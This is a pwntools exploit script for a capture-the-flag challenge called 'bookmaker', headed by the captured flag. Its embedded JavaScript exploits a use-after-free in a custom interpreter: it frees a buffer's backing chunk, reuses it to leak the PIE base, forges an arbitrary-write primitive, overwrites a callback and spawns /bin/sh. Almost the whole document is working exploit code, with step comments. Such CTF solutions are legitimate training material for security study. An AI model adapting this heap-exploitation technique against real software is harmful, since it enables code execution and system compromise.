# UMDCTF{tahmid-will-surely-finish_his_challenge_on_time!!}

#!/usr/bin/env python3
from pwn import *

PORT =  30307
HOST = "challs.umdctf.io"

e = context.binary = ELF('./bookmaker', checksec=False)
context.log_level = 'debug'

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            set follow-fork-mode parent
            b *$piebase+0xb3c0
            c
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return e.process()

p = conn()

# GDB()

js = r'''
function hex(x) {
    return "0x" + x.toString(16);
}

// 1. Allocate native chunk 0x30 and keep JS ArrayBuffer alias.
let ledger = new Ledger(0x30);
let ab = ledger.view();
let u64 = new BigUint64Array(ab);

// 2. Free backing chunk, ArrayBuffer is now dangling.
ledger.recycle();

// 3. Reuse freed 0x30 chunk with native ticket.
let id = mintWire();

// ticket layout now visible through u64:
// u64[0] = dst
// u64[1] = size
// u64[2] = magic
// u64[3] = resolver = PIE + 0xb390
let pie_base = u64[3] - 0xb390n;
let win = pie_base + 0xb3c0n;
let settle_cb = pie_base + 0xcc108n;

print("[+] ticket id = " + id);
print("[+] PIE base  = " + hex(pie_base));
print("[+] win       = " + hex(win));
print("[+] callback  = " + hex(settle_cb));

// 4. Turn ticket into arbitrary write primitive.
// wireWrite(id, buf) copies buf into ticket->dst.
u64[0] = settle_cb;
u64[1] = 8n;

// 5. Write win address into global settle callback.
let payload = new ArrayBuffer(8);
poke64(payload, 0, Number(win));
wireWrite(id, payload);

// 6. Trigger callback => system("/bin/sh").
settle("owned");

// Important: force interpreter to stop reading JS,
// leaving stdin for /bin/sh.
__END_MARKET_SCRIPT__
'''

p.send(js.encode())

p.interactive()